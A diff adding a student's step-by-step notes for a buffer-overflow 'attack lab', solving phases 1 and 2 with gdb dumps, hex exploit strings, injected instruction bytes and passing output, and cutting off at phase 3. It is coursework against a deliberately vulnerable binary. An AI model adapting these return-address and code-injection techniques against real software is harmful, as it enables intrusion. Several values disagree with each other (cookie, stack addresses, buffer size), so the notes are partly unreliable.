@@ -1,0 +1,184 @@
+Phase 1
+
+run the program in gdb
+
+b getbuf // set a breakpoint at getbuf
+
+disas 
+(gdb) disas
+Dump of assembler code for function getbuf:
+=> 0x0000000000401b94 <+0>:     sub    $0x28,%rsp
+   0x0000000000401b98 <+4>:     mov    %rsp,%rdi
+   0x0000000000401b9b <+7>:     call   0x401e2f <Gets>
+   0x0000000000401ba0 <+12>:    mov    $0x1,%eax
+   0x0000000000401ba5 <+17>:    add    $0x28,%rsp
+   0x0000000000401ba9 <+21>:    ret
+
+disas touch1 to get the address 
+disas touch1
+Dump of assembler code for function touch1:
+   0x0000000000401baa <+0>:     sub    $0x8,%rsp
+   0x0000000000401bae <+4>:     movl   $0x1,0x5984(%rip)        # 0x40753c <vlevel>
+   0x0000000000401bb8 <+14>:    lea    0x2747(%rip),%rdi        # 0x404306
+   0x0000000000401bbf <+21>:    call   0x401080 <puts@plt>
+   0x0000000000401bc4 <+26>:    mov    $0x1,%edi
+   0x0000000000401bc9 <+31>:    call   0x402093 <validate>
+   0x0000000000401bce <+36>:    mov    $0x0,%edi
+   0x0000000000401bd3 <+41>:    call   0x401200 <exit@plt>
+End of assembler dump.
+
+sub    $0x8,%rsp Buffer size is 40 followed by touch1 dress
+
+rtarget — address —> 0000000000401baa
+
+// since this is little-endian we put the adress in the reverse order 
+create a text file named phase1.txt which will look like below
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+aa 1b 40 00 00 00 00 00
+
+take this file and run it through the program hex2raw, which will generate raw exploit strings
+
+./hex2raw < phase1.txt > raw-phase1.txt
+
+ you run the raw file now
+
+./ctarget < raw-phase1.txt
+
+Cookie: 0x130c47c7
+Type string:Touch1!: You called touch1()
+Valid solution for level 1 with target ctarget
+PASS: Sent exploit string to server to be validated.
+NICE JOB!
+20:34 [aomondi@wilkes:~/Desktop/bits-handout/lab5/target19]
+
+******************************************************************************************************
+
+Phase 2
+
+use this instruction to get the readable for touch 2 grep -A 20 '<touch2>:' ctarget_dump.txt
+
+we get the touch2 address as 0000000000401bd8;
+
+0000000000401bd8 <touch2>:
+  401bd8: 48 83 ec 08                   subq    $0x8, %rsp
+  401bdc: 89 fa                         movl    %edi, %edx
+  401bde: c7 05 54 59 00 00 02 00 00 00 movl    $0x2, 0x5954(%rip)      # 0x40753c <vlevel>
+  401be8: 39 3d 56 59 00 00             cmpl    %edi, 0x5956(%rip)      # 0x407544 <cookie>
+  401bee: 74 2a                         je      0x401c1a <touch2+0x42>
+  401bf0: 48 8d 35 59 27 00 00          leaq    0x2759(%rip), %rsi      # 0x404350 <_IO_stdin_used+0x350>
+  401bf7: bf 01 00 00 00                movl    $0x1, %edi
+  401bfc: b8 00 00 00 00                movl    $0x0, %eax
+  401c01: e8 aa f5 ff ff                callq   0x4011b0 <__printf_chk@plt>
+  401c06: bf 02 00 00 00                movl    $0x2, %edi
+  401c0b: e8 53 05 00 00                callq   0x402163 <fail>
+  401c10: bf 00 00 00 00                movl    $0x0, %edi
+  401c15: e8 e6 f5 ff ff                callq   0x401200 <exit@plt>
+  401c1a: 48 8d 35 07 27 00 00          leaq    0x2707(%rip), %rsi      # 0x404328 <_IO_stdin_used+0x328>
+  401c21: bf 01 00 00 00                movl    $0x1, %edi
+  401c26: b8 00 00 00 00                movl    $0x0, %eax
+  401c2b: e8 80 f5 ff ff                callq   0x4011b0 <__printf_chk@plt>
+  401c30: bf 02 00 00 00                movl    $0x2, %edi
+  401c35: e8 59 04 00 00                callq   0x402093 <validate>
+  401c3a: eb d4                         jmp     0x401c10 <touch2+0x38>
+20:40 [aomondi@wilkes:~/Desktop/bits-handout/lab5/target19]
+9 % 
+
+For phase 2 we want to edit the rdi register and store our cookie in there.
+
+So you have to write some assembly code for that task, create a file called phase2.s and write the below code, replacing the cookie and with yours
+
+  movq $0x434b4b70,%rdi /* move your cookie to register %rdi */
+  retq                  /* return */
+Now you need the byte representation of the code you wrote above. compile it with gcc then dissasemble it
+
+gcc -c phase2.s
+objdump -d phase2.o  > phase2.d 
+Now open the file phase2.d and you will get something like below
+
+Disassembly of section .text:
+
+0000000000000000 <.text>:
+   0:	48 c7 c7 70 4b 4b 43 	mov    $0x434b4b70,%rdi
+   c:	c3                   	retq   
+The byte representation of the assembly code is 48 c7 c7 70 4b 4b 43 c3
+
+Now we need to find the address of rsp register
+
+run ctarget through gdb
+
+gdb ctarget
+
+set a breakpoint at getbuf
+
+b getbuf
+
+run ctarget
+
+r
+
+Now do
+
+disas
+
+You will get something like below (this doesn't match the above code as it is an updated version)
+
+Dump of assembler code for function getbuf:
+=> 0x0000000000401b94 <+0>:     sub    $0x28,%rsp
+   0x0000000000401b98 <+4>:     mov    %rsp,%rdi
+   0x0000000000401b9b <+7>:     call   0x401e2f <Gets>
+   0x0000000000401ba0 <+12>:    mov    $0x1,%eax
+   0x0000000000401ba5 <+17>:    add    $0x28,%rsp
+   0x0000000000401ba9 <+21>:    ret
+
+Now we need to run the code until the instruction just below callq  0x401ab6 <Gets> so you will do something like
+
+until *0x401838
+
+Then it will ask you type a string...type a string longer than the buffer(24 characters in this case). After that do
+
+x/s $rsp
+
+You will get something like
+
+(gdb) x/s $rsp
+0x55620cd8:	"ldsjfsdkfjdslfkjsdlkfjsdlkfjsldkfjsldkjf" // the random string I typed
+The address on the left side is what we want. 0x55620cd8
+
+Now, create a text file named phase2.txt which will look something like below and don't forget the bytes for rsp and touch2 go in reverse
+create a phase2.txt file 
+48 c7 c7 c7 47 0c 13 c3 /*this sets your cookie*/
+00 00 00 00 00 00 00 00 /*padding to make it 40 bytes*/
+00 00 00 00 00 00 00 00 /*padding to make it 40 bytes*/
+00 00 00 00 00 00 00 00 /*padding to make it 40 bytes*/
+00 00 00 00 00 00 00 00 /*padding to make it 40 bytes*/
+48 95 60 55 00 00 00 00 /* address of register %rsp */
+d8 1b 40 00 00 00 00 00 /*address of touch2 function */
+
+Run it through hex2raw
+
+./hex2raw < phase2.txt > raw-phase2.txt
+
+Finally, run the raw file
+
+./ctarget < raw-phase2.txt
+
+What the exploit does is that first it sets register rdi to our cookie value is transferred to $rsp register so after we enter our string and getbuf tries to return control to the calling function, we want it to point to the rsp address so it will execute the code to set the cookie and finally we call touch2 after the cookie is set.
+
+43 % ./hex2raw < phase2.txt | ./ctarget
+Cookie: 0x130c47c7
+Type string:Touch2!: You called touch2(0x130c47c7)
+Valid solution for level 2 with target ctarget
+PASS: Sent exploit string to server to be validated.
+NICE JOB!
+21:36 [aomondi@wilkes:~/Desktop/bits-handout/lab5/target19]
+44 % 
+
+******************************************************************************************************
+phase3 
+address - 0x0000000000401ceb 
+
+rsp from phase2 $rsp 0x55609548 + 0x28 = 0x55609580
